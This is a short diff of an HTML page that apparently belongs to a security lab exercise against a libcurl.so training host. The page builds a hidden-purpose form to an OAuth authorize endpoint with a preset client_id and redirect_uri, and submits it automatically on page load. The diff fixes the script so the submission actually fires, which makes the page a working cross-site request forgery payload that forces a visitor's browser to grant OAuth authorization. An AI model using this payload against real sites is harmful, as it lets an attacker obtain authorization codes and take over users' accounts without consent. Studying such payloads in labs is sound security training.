@@ -1,6 +1,6 @@
 <html>
 
-<form action="http://authorization-ptl-e3fc45c0-77a0cc1f.libcurl.so/oauth/authorize" method="GET">
+<form id="myform" action="http://authorization-ptl-e3fc45c0-77a0cc1f.libcurl.so/oauth/authorize" method="GET">
 	<input type="text" name="client_id" value="ed8dcb27c5ff3627375996a8cffdb97df35cfe770ccab11077bc94b140771b2f">
 	<input type="text" name="redirect_uri" value="http%3A%2F%2Fptl-e3fc45c0-77a0cc1f.libcurl.so%2Fusers%2Fauth%2Fmyprovider%2Fcallback">
 	<input type="text" name="response_type" value="code">
@@ -8,7 +8,7 @@
 </form>
 
 <script type="text/javascript">
-	document.form[0].submit()
+	document.myform.submit()
 </script>
 
 </html>
